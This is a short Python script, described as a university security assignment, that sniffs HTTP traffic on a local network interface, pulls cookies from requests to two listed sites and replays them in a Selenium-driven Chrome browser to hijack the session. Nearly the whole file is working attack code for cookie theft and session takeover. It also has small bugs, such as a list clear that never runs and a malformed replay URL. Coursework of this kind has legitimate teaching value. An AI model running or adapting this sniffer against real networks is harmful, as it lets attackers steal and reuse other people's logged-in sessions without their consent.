# -----------------------------------------
# task fo security subject - cookie sniffer
#
# (C) 2019 Karolina Antonik
# -----------------------------------------
import scapy.all as scapy
from scapy_http import http
import argparse
from selenium import webdriver
import time 

# list of pages for sniffing
pages = [
    'www.mpietrek.pl/cybersec/',
    'testing-ground.scraping.pro/login?mode=welcome',
]

cookies = []
foundPage  = ''

def process_packets(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            foundPage = ''
            host = packet[http.HTTPRequest].Host.decode('utf-8')
            path = packet[http.HTTPRequest].Path.decode('utf-8')
            cookie = packet[http.HTTPRequest].Cookie.decode('utf-8')

            for page in pages:
                if (host+path) == page:
                    foundPage = page
                    break
            if foundPage:
                txt_cookies = cookie.split('; ')
                cookies.clear
                for cookie in txt_cookies:
                    temp = cookie.split('=')
                    cookies.append({'name': temp[0], 'value': temp[1]})

                if cookies:
                    print('Found page:',page)
                    if page[:3] == "www":
                        p = page[3:]
                    else:
                        p = page

                    driver = webdriver.Chrome('/Users/karolinaantonik/Desktop/chromedriver/chromedriver')
                    driver.get('http://'+p)
                    time.sleep(3)

                    for cookie in cookies:
                        driver.add_cookie(cookie)

                    driver.get('http://.'+p)
                    time.sleep(7)
                    driver.close()
    
    except:
        pass
            

scapy.sniff(iface='en0', store=False, prn=process_packets)